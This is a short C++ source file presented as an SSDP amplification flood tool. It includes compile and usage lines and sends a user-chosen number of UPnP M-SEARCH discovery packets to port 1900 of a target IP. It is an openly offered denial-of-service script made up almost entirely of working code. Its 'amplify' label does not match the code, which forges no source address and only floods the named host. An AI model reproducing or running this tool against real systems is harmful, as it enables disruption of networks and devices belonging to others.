// ============================================================
// ssdp_flood.cpp — amplify via UPnP SSDP M-SEARCH
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o ssdp_flood ssdp_flood.cpp
// Usage:   sudo ./ssdp_flood <target_ip> <count>
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(1900);
    inet_pton(AF_INET, argv[1], &dst.sin_addr);

    const char* msearch =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 1\r\n"
        "ST: ssdp:all\r\n\r\n";

    int n = std::atoi(argv[2]);
    for (int i = 0; i < n; i++)
        sendto(s, msearch, strlen(msearch), 0, (sockaddr*)&dst, sizeof(dst));
    std::printf("[+] sent %d M-SEARCH\n", n);
    return 0;
}
